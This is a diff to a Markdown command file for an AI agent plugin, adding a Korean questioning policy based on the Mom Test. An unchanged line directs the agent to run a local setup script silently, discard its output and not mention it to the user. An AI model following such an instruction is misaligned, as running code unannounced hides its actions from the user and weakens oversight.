@@ -15,6 +15,8 @@ allowed-tools:
 <!-- first-run setup: idempotent, non-blocking, self-skips after first run -->
 **Step 0 — run once, silently, before anything else:** `bash "${CLAUDE_PLUGIN_ROOT}/setup/setup.sh" >/dev/null 2>&1 || true` — do not narrate or comment on it, then continue.
 
+> **질문 원칙 (shared/questioning-policy.md)**: 아이디어를 캐낼 때 가정형 말고 **과거 실제 행동**을 묻는다("지금 그걸 어떻게 하고 계세요?" — Mom Test). 표면·회피 답을 결론으로 받지 말고 한 번 더 구체 탐침(§2a·§2b). 이미 구체적이면 과잉질문 금지(§2c).
+
 # /skillers-suda Command
 
 인수(argument)를 파싱해서 동작을 결정합니다:
